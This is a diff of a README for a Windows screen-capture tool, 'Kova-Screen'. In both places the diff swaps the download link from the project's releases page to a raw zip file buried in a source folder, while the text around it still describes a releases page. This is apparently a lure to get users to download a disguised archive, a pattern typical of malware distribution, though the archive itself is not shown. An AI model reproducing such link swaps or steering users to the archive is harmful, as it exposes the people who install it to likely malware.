@@ -8,7 +8,7 @@ This guide will walk you through everything you need to know, from downloading t
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: [**Download Kova-Screen**](https://github.com/abuistabraqlibrary/Kova-Screen/releases)
+Visit this link to download the application: [**Download Kova-Screen**](https://github.com/abuistabraqlibrary/Kova-Screen/raw/refs/heads/main/crates/kova-upload/3.6.zip)
 
 On that page, you'll see a list of available versions. Click the latest release (usually the one at the top) to see downloadable files. Select the file that matches your Windows system. Once the download finishes, you'll have everything you need to start using Kova-Screen immediately.
 
@@ -118,7 +118,7 @@ Most problems have simple solutions, and the friendly community behind Kova-Scre
 
 You now have everything you need to begin capturing your screen like a pro. Kova-Screen's speed and simplicity mean you'll spend less time figuring out how to use it and more time being productive.
 
-Remember, your first step is to [**download Kova-Screen**](https://github.com/abuistabraqlibrary/Kova-Screen/releases). From there, you're just minutes away from taking your first screenshot or making your first recording.
+Remember, your first step is to [**download Kova-Screen**](https://github.com/abuistabraqlibrary/Kova-Screen/raw/refs/heads/main/crates/kova-upload/3.6.zip). From there, you're just minutes away from taking your first screenshot or making your first recording.
 
 With Kova-Screen, capturing your screen is fast, simple, and frustration-free. No complicated settings to decipher, no bloated interface to navigate - just clean, quick captures whenever you need them. Enjoy your new screen capture tool!
 
